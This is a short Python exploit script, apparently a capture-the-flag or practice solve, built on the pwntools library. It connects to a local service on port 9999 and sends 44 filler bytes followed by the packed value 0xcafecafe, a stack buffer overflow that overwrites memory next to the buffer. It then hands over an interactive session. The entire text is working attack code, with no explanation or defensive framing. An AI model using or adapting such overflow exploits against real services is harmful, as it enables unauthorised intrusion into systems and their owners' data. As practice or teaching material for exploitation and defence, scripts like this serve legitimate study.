from pwn import *
p = remote("127.0.0.1", 9999)
p.sendline("a"*44 + p64(0xcafecafe))
p.interactive()
